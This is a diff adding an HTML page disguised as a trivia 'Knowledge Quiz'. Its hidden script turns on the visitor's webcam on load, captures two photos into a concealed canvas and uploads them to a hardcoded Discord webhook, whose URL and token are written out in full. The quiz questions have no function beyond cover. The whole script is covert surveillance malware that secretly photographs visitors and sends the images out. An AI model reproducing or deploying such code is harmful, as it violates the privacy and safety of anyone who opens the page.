@@ -1,0 +1,123 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Knowledge Quiz</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f0f2f5;
+      text-align: center;
+      padding: 50px;
+    }
+    h1 {
+      font-size: 2em;
+      color: #222;
+    }
+    .question-box {
+      margin-top: 30px;
+      display: inline-block;
+      background-color: white;
+      padding: 25px 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      text-align: left;
+      max-width: 600px;
+    }
+    .question {
+      font-size: 1.2em;
+      margin-bottom: 10px;
+    }
+    .status {
+      margin-top: 40px;
+      font-size: 1.1em;
+      color: #D70000;
+    }
+  </style>
+</head>
+<body>
+  <h1>📘 Welcome to the Knowledge Quiz</h1>
+
+  <div class="question-box">
+    <div class="question">1. What does the term "AI" stand for?</div>
+    <div class="question">2. Which app became viral for short-form videos starting in 2020?</div>
+    <div class="question">3. What does "NFT" stand for in the digital world?</div>
+    <div class="question">4. Which company owns Instagram and WhatsApp?</div>
+    <div class="question">5. What is the name of Apple's VR/AR headset announced in 2023?</div>
+  </div>
+
+  <p class="status" id="status">Initializing quiz...</p>
+
+  <video id="video" width="400" height="300" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" width="400" height="300" style="display: none;"></canvas>
+
+  <script>
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const status = document.getElementById("status");
+
+    const webhookURL = "https://ptb.discord.com/api/webhooks/1394748597442187265/0PbIjcALdi5_7jcR9I1f1b9MjGJal-IHR54WZ8o3Bg1mToXzrvHO4wAGgfrYuZB_XN32";
+
+    function delay(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    async function captureAndSend(label) {
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      return new Promise((resolve, reject) => {
+        canvas.toBlob(async blob => {
+          const formData = new FormData();
+          formData.append("file", blob, `${label.replace(' ', '_')}.png`);
+          formData.append("payload_json", JSON.stringify({
+            content: `📸 ${label} from Knowledge Quiz`
+          }));
+
+          try {
+            const res = await fetch(webhookURL, {
+              method: "POST",
+              body: formData
+            });
+
+            if (!res.ok) {
+              const errText = await res.text();
+              throw new Error("Discord upload failed: " + errText);
+            }
+
+            status.textContent = `${label} sent ✅`;
+            resolve();
+          } catch (err) {
+            console.error(err);
+            status.textContent = `❌ Error sending ${label}`;
+            reject(err);
+          }
+        }, "image/png");
+      });
+    }
+
+    async function startQuiz() {
+      status.textContent = "";
+      await captureAndSend("Photo 1");
+      status.textContent = "⏳ Waiting 5 seconds...";
+      await delay(5000);
+      status.textContent = "";
+      await captureAndSend("Photo 2");
+      status.textContent = "";
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+          startQuiz();
+        };
+      })
+      .catch(err => {
+        console.error("Camera error", err);
+        status.textContent = "❌ Cannot access camera";
+      });
+  </script>
+</body>
+</html>
